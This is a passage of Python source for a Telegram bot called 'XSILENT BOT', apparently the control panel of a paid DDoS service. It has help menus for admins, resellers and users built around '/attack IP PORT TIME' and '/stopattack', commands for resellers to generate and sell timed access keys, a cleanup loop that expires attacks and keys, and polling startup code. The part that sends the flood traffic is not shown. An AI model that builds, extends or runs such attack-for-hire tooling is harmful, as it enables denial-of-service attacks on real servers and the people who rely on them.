/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group

📢 OTHER COMMANDS:
/broadcast MSG - Broadcast message
/stopattack IP:PORT - Stop attack
/allusers - List all users
/allgroups - List all groups
/api_status - Check API status
"""
    elif uid in resellers:
        help_text = """🔥 XSILENT BOT HELP - RESELLER

📝 ATTACK COMMANDS:
/attack IP PORT TIME - Start attack
/status - Check bot status

🔑 KEY COMMANDS:
/genkey 1 - Generate 1 day key
/genkey 5h - Generate 5 hour key
/mykeys - List your generated keys
"""
    elif uid in users:
        help_text = """🔥 XSILENT BOT HELP - USER

📝 ATTACK COMMANDS:
/attack IP PORT TIME - Start attack
/status - Check bot status

🔑 KEY COMMANDS:
/redeem KEY - Redeem access key

ℹ️ INFO:
/start - Show start message
/help - Show this help
"""
    else:
        help_text = """🔥 XSILENT BOT HELP

🔑 TO GET ACCESS:
/redeem KEY - Redeem your access key

ℹ️ INFO:
/start - Show start message
/help - Show this help
"""
    
    bot.reply_to(msg, help_text)

def cleanup_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users and user_id not in ADMIN_ID:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)

# Message handler to block host commands
@bot.message_handler(func=lambda msg: True)
def block_host_commands(msg):
    """Block commands that are in the blocked list"""
    blocked_commands_data = settings_collection.find_one({"_id": "blocked_commands"})
    if blocked_commands_data:
        blocked_commands = blocked_commands_data.get("commands", [])
        for blocked_cmd in blocked_commands:
            if msg.text and msg.text.startswith(blocked_cmd):
                bot.reply_to(msg, "🚫 BLOCKED BOT\n\nThis command has been blocked by the host.\nContact bot owner for more information.")
                return

cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
cleanup_thread.start()

print("XSILENT BOT STARTED - Owner: 8487946379")
print("Features:")
print("✅ Host command blocking feature enabled")
print("✅ User blocking feature enabled")
print("✅ Fixed key redemption issue")
print("✅ Block user command added (/block, /unblock, /blockedlist)")

bot.infinity_polling()
